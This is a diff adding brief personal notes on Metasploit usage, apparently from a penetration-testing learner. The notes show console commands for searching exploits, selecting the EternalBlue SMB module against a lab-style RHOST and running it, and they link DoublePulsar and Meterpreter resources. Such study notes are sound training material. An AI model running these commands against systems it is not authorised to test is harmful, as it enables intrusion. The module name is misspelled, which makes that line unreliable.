@@ -1,0 +1,40 @@
+
+explanation
+https://www.youtube.com/watch?v=xSkTIgPJ9Z0
+https://www.duckademy.com/downloads
+
+#flash old versions to exploit
+https://helpx.adobe.com/dk/flash-player/kb/archived-flash-player-versions.html
+
+
+MSF USAGE
+#list all exploits feks
+search type:exploit
+#search by platflown and application
+search type:exploit platform:windows ftp
+
+
+#use a exploit feks
+use exploit/windows/smb/ms17_10_ethernalblue
+#see possible commands ? , see options
+options
+show options
+show advanced
+#change an option
+set RHOST  10.11.11.118
+
+#run
+exploit -j
+
+---
+explain
+https://www.offensive-security.com/metasploit-unleashed/msfconsole-commands/
+
+--meterpreter basic
+https://www.offensive-security.com/metasploit-unleashed/meterpreter-basics/
+
+------------
+double pulsar verbiage
+https://www.rapid7.com/security-response/doublepulsar/
+code injector
+https://github.com/countercept/doublepulsar-usermode-injector
